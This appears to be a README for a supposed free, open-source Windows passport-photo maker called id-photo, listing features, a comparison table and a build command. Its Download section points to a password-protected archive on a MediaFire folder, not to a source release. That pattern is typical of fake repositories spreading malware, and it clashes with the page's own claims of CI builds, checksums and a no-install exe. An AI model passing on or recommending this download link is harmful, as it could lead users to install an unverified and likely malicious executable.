# id-photo

🪪 Free, open-source passport photo maker for Windows — crop presets, background swap, print sheets. 100 MB portable, offline, MIT, no watermark.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Country size presets** — passport, visa and licence dimensions built in with head-position guides
- ✅ **Background replacement** — a local cutout model swaps any backdrop for the required white or gray
- ✅ **Print sheet layout** — sixteen photos arranged on a 10x15 sheet with cut marks, at true 300 dpi
- ✅ **Compliance overlay** — head height and eye line guides sit over the crop so requirements are visible
- ✅ **Lighting check** — shadow and glare warnings before you print, not after the office rejects it
- ✅ **No watermark, no upload** — prints are clean and the portrait never leaves the machine
- ✅ **100 MB self-contained exe** — runtime bundled, models download separately, offline after that, MIT

## Why id-photo

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **id-photo** | Online passport tools | Photoshop | Photo booth |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Paid per sheet | Subscription | Per session |
| Open source | **Yes** | No | No | No
| Portraits stay local | **Yes** | Upload | Yes | Yes
| No watermark | **Yes** | Rare | Yes | Yes
| Compliance guides | **Yes** | Partial | Manual | Yes
| Portable, no install | **Yes, 100 MB** | Browser | Installer | N/A

## FAQ

**how to make a passport photo at home for free on Windows?**

Online makers get their payback through watermarks, uploads and per-sheet fees, and studios charge for a two-minute crop. id-photo applies the right dimensions, swaps the background locally and lays out a print sheet at true dpi. It is a 100 MB portable exe, MIT, offline.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark studio (#121418, blue #2563EB): portrait centered with head-height and eye-line guides overlaid, preset dropdown reading US passport 2x2, background chip set to white.
2. Print sheet preview: sixteen copies on a 10x15 canvas with cut marks, dpi badge reading 300, printer margin warning resolved in green.
3. Compliance panel: lighting score, shadow note under the left jaw, retake hint, export PNG and print buttons side by side.

## Download

| Source | Link |
|---|---|
| 💾 **Installer id-photo** | [Installer id-photo](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).